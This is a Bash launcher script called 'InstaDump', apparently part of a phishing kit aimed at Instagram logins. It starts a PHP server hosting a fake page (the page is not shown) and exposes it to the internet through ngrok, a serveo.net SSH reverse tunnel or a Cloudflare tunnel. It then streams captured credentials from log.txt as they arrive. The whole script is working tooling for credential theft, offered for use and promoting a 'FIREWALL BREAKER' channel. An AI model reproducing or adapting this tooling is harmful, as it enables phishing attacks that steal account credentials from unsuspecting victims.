#!/bin/bash

# Required Packages
REQUIRED_PACKAGES=(figlet lolcat php curl)
MISSING_PACKAGES=()

# Check and install missing packages
for package in "${REQUIRED_PACKAGES[@]}"; do
    if ! command -v $package &>/dev/null; then
        MISSING_PACKAGES+=("$package")
    fi
done

if [ ${#MISSING_PACKAGES[@]} -ne 0 ]; then
    echo "Installing missing packages: ${MISSING_PACKAGES[*]}"
    pkg install -y ${MISSING_PACKAGES[*]}
fi

# Clear screen
clear

# Display banner
figlet -f slant "INSTADUMP" | lolcat
echo "----------------------------------------" | lolcat
echo " WELCOME TO InstaDump - Created by ALOK THAKUR" | lolcat
echo "----------------------------------------" | lolcat
echo ""  
echo "----------------------------------------" | lolcat
echo "       Subscribe Now: FIREWALL BREAKER  " | lolcat
echo "----------------------------------------" | lolcat

echo -e "\nChoose an option:" | lolcat
echo "[0] Localhost" | lolcat
echo "[1] Ngrok" | lolcat
echo "[2] Server SSH" | lolcat
echo "[3] Cloudflare" | lolcat

echo -e "\n[+] Choose a Port Forwarding option: " | lolcat
read option

echo -e "\nYou selected option $option" | lolcat

# Start the server and generate link
case $option in
    0)
        echo "Starting server on Localhost..." | lolcat
        php -S 127.0.0.1:8080 -t . &
        sleep 2
        echo -e "[+] Your server is live at: http://127.0.0.1:8080\n" | lolcat
        ;;
    1)
        echo "Starting Ngrok server..." | lolcat
        ngrok http 8080 &
        sleep 5
        curl --silent --show-error http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-zA-Z.-]*\.ngrok.io' | head -n1
        ;;
    2)
        echo "Starting SSH tunneling..." | lolcat
        ssh -R 80:localhost:8080 serveo.net &
        sleep 5
        echo "[+] Your SSH server is live at: Check serveo.net logs" | lolcat
        ;;
    3)
        echo "Starting Cloudflare tunnel..." | lolcat
        cloudflared tunnel --url http://127.0.0.1:8080 &
        sleep 5
        curl --silent --show-error http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-zA-Z.-]*\.trycloudflare.com' | head -n1
        ;;
    *)
        echo "Invalid option!" | lolcat
        exit 1
        ;;
esac

# Live credential capture (only new entries)
echo -e "\n[+] Waiting for credentials...\n" | lolcat
tail -n 0 -f log.txt | while read line; do
    echo "$line" | lolcat
done
